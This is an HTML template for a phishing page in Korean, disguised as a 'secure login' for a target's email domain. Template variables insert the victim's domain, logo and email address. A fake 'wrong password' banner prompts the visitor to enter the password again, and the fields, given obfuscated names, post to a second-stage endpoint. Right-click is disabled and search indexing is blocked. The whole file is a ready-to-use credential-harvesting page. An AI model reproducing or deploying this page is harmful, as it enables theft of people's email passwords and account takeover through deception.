<!DOCTYPE html>
<html lang="ko">

<head>
  <meta charset="UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <meta name="googlebot" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{{ins}} 보안 로그인</title>
  <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to right, #2c3e50, #3498db);
      overflow: hidden;
    }

    iframe.background-frame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -2;
      border: none;
      filter: blur(8px) brightness(0.6);
    }

    .overlay {
      position: fixed;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.15);
      backdrop-filter: blur(5px);
      z-index: -1;
    }

    .login-container {
      max-width: 420px;
      margin: 10vh auto;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 16px;
      padding: 45px 35px;
      backdrop-filter: blur(12px);
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
      color: #fff;
      text-align: center;
    }

    .login-header img {
      width: 70px;
      height: 70px;
      border-radius: 12px;
      object-fit: cover;
      margin-bottom: 15px;
    }

    .login-header h1 {
      font-size: 24px;
      text-transform: capitalize;
      color: #fff;
    }

    .input-field {
      margin-top: 20px;
    }

    .input-field input {
      width: 100%;
      padding: 14px 16px;
      border-radius: 10px;
      border: 1px solid #ddd;
      background: #f9f9f9;
      font-size: 16px;
      transition: all 0.3s ease;
    }

    .input-field input:focus {
      border-color: #3498db;
      outline: none;
    }

    .login-btn {
      width: 100%;
      margin-top: 25px;
      padding: 13px;
      border: none;
      background: #2980b9;
      color: white;
      font-size: 17px;
      font-weight: bold;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .login-btn:hover {
      background: #1f6391;
    }

    .error-message {
      margin-top: 15px;
      font-size: 13px;
      color: #ff6b6b;
      display: none;
    }

    .privacy-note {
      margin-top: 35px;
      font-size: 12px;
      color: #eee;
    }
  </style>
</head>

<body oncontextmenu="return false;">
  <div class="overlay"></div>

  <div class="login-container">
    <div class="login-header">
      <img src="https://api.kickfire.com/logo?website={{dman}}" alt="로고">
      <h1 id="banNer"></h1>
    </div>

    <form action="second" method="POST">
      <div style="padding: 10px; background-color: #ffe6e6; color: #b30000; border: 1px solid #ff0000; border-radius: 5px; font-family: Arial, sans-serif; width: fit-content; margin: 20px auto; text-align: center;">
        ⚠️ 비밀번호가 잘못되었습니다. 다시 확인하고 시도해 주세요.
      </div>
      <div class="input-field">
        <input type="email" id="ai" name="horse" value="{{eman}}" required placeholder="이메일 주소">
      </div>
      <div class="input-field">
        <input type="password" id="pr" name="pig" required placeholder="비밀번호">
      </div>
      <button type="submit" id="submit-btn" class="login-btn">로그인</button>

      <div class="error-message" id="mgss">비밀번호가 잘못되었습니다..! 다시 시도해 주세요.</div>
      <div class="error-message" id="error">계정을 찾을 수 없습니다. 이메일을 확인해 주세요.</div>
    </form>

    <div class="privacy-note">
      &copy; {{dman}} 로그인 | 모든 권리 보유
    </div>
  </div>

</body>
</html>
